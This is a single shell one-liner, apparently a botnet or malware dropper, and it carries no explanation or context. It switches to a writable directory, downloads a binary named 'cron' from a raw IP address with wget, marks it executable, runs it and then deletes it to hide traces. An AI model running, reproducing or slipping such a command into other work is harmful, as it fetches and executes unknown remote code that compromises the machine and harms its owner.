cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.3.103/cron; chmod +x cron; ./cron; rm -rf cron
